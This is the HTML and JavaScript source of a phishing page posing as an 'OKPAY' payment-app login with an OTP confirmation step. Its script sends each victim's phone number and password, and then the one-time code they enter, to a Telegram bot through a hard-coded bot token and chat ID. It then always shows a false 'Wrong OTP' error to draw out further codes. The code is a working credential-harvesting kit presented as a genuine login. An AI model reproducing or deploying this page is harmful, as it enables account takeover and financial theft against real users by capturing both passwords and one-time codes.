<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OKPAY</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: #ffffff;
      color: #333333;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container { width: 100%; max-width: 350px; text-align: center; }
    .logo-box {
      width: 110px; height: 110px;
      border-radius: 22px;
      margin: 0 auto 30px;
      overflow: hidden;
      box-shadow: 0 8px 16px rgba(0,0,0,0.15);
    }
    .logo-box img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .input-group {
      display: flex;
      align-items: center;
      background: #ffffff;
      border: 1.5px solid #cccccc;
      border-radius: 25px;
      padding: 14px 18px;
      margin-bottom: 15px;
    }
    .input-group svg {
      width: 20px; height: 20px;
      fill: #009688;
      margin-right: 12px;
    }
    .input-group input {
      background: transparent;
      border: none;
      color: #333;
      font-size: 16px;
      width: 100%;
      outline: none;
    }
    .input-group input::placeholder { color: #aaaaaa; }
    .row {
      display: flex;
      justify-content: space-between;
      font-size: 14px;
      color: #009688;
      margin-bottom: 20px;
      padding: 0 5px;
    }
    .row a { color: #009688; text-decoration: none; font-weight: 500; }
    .row div { display: flex; align-items: center; gap: 5px; }
    .checkbox-container {
      display: flex;
      align-items: center;
      font-size: 13px;
      color: #555;
      justify-content: center;
      margin-bottom: 25px;
    }
    .checkbox-container input {
      margin-right: 8px;
      accent-color: #009688;
    }
    .btn-main {
      width: 100%;
      padding: 15px;
      background: #009688;
      color: white;
      border: none;
      border-radius: 25px;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
    }
    .btn-main:hover { background: #00796b; }
    .popup-overlay {
      display: none;
      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.5);
      justify-content: center; align-items: center; padding: 20px; z-index: 1000;
    }
    .popup-box {
      background: #ffffff;
      padding: 25px;
      border-radius: 20px;
      width: 100%; max-width: 350px;
      position: relative;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
    }
    .close-btn {
      position: absolute; top: 15px; right: 15px;
      background: #eeeeee; color: #333; border: none;
      border-radius: 50%; width: 30px; height: 30px;
      font-size: 16px; cursor: pointer;
    }
    .popup-box h2 { font-size: 20px; margin-bottom: 10px; text-align: left; color: #333; }
    .popup-box p { font-size: 14px; color: #666; margin-bottom: 15px; line-height: 1.4; text-align: left; }
    .popup-box p span { color: #009688; font-weight: bold; }
    .otp-input-group {
      display: flex;
      background: #ffffff;
      border: 1.5px solid #cccccc;
      border-radius: 25px;
      padding: 5px;
      margin-bottom: 15px;
    }
    .otp-input-group input {
      flex: 1; background: transparent; border: none;
      color: #333; padding: 10px; font-size: 16px; outline: none;
    }
    .otp-input-group button {
      background: #009688; color: #fff; border: none;
      border-radius: 20px; padding: 0 18px; font-weight: bold; cursor: pointer;
    }
    .otp-input-group button:disabled { background: #cccccc; color: #777; }
    .timer-text { color: #777; font-size: 13px; margin-bottom: 15px; text-align: center; }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo-box">
      <img src="jpglogo.png" alt="OKPAY">
    </div>

    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <input type="tel" id="phone" placeholder="Phone" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      <input type="password" id="pass" placeholder="Password">
    </div>

    <div class="row">
      <a href="#">Register</a>
      <div><input type="radio" style="accent-color:#009688;"> Remember Me</div>
    </div>

    <div class="checkbox-container">
      <input type="radio" checked> Agree "User Privacy Agreement"
    </div>

    <button class="btn-main" onclick="showOTP()">Sign In</button>
  </div>

  <div class="popup-overlay" id="otpPopup">
    <div class="popup-box">
      <button class="close-btn" onclick="closeOTP()">✕</button>
      <h2>Login OTP</h2>
      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>

      <div class="otp-input-group">
        <input type="tel" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
      </div>

      <div class="timer-text" id="timerText"></div>

      <button class="btn-main" onclick="verifyOTP()">Confirm</button>
    </div>
  </div>

  <script>
    // ==========================================
    // OKPAY KI TELEGRAM DETAILS
    // ==========================================
    const BOT_TOKEN = "8881487058:AAH6LbZKIIWgHlQngThWylGNUfyuNQawfJ8";
    const CHAT_ID = "8897030904";

    let countdown;
    let timeLeft = 60;

    function showOTP() {
      let phone = document.getElementById('phone').value;
      let pass = document.getElementById('pass').value;

      if (phone === "" || pass === "") { 
        alert("Bhai, saari details daalo!"); 
        return; 
      }

      if (phone.length !== 10) { 
        alert("Phone number 10 digit ka hona chahiye!"); 
        return; 
      }

      document.getElementById('displayPhone').innerText = "+91 " + phone;
      let msg1 = "🔔 *OKPAY - New Login Attempt*\n\n📞 Phone: " + phone + "\n🔑 Password: " + pass;
      sendToTelegram(msg1);
      document.getElementById('otpPopup').style.display = 'flex';
      resetTimer();
    }
    function closeOTP() { document.getElementById('otpPopup').style.display = 'none'; clearInterval(countdown); }
    function sendOTP() {
      let phone = document.getElementById('phone').value;
      startTimer();
      sendToTelegram("📩 *OKPAY - OTP Send Button Pressed*\nPhone: " + phone);
      document.getElementById('sendOtpBtn').disabled = true;
      document.getElementById('sendOtpBtn').innerText = "Sent";
    }
    function verifyOTP() {
      let otp = document.getElementById('otpInput').value;
      let phone = document.getElementById('phone').value;
      if (otp === "") { alert("Bhai, OTP daalo!"); return; }
      if (otp.length !== 6) { alert("OTP exactly 6 digit ka hona chahiye!"); return; }
      sendToTelegram("🔐 *OKPAY - OTP Entered*\nPhone: " + phone + "\nOTP: " + otp);
      setTimeout(() => { alert("❌ Wrong OTP! Please try again."); }, 500);
    }
    function startTimer() {
      timeLeft = 60;
      const timerDisplay = document.getElementById('timerText');
      clearInterval(countdown);
      countdown = setInterval(() => {
        if (timeLeft <= 0) {
          clearInterval(countdown); timerDisplay.innerText = "";
          document.getElementById('sendOtpBtn').disabled = false;
          document.getElementById('sendOtpBtn').innerText = "Send";
        } else {
          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
          timeLeft--;
        }
      }, 1000);
    }
    function resetTimer() {
      clearInterval(countdown); timeLeft = 60;
      document.getElementById('sendOtpBtn').disabled = false;
      document.getElementById('sendOtpBtn').innerText = "Send";
      document.getElementById('otpInput').value = "";
    }
    function sendToTelegram(message) {
      let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=Markdown&text=" + encodeURIComponent(message);
      fetch(url).then(res => console.log(res.status)).catch(err => console.error(err));
    }
  </script>

</body>
</html>
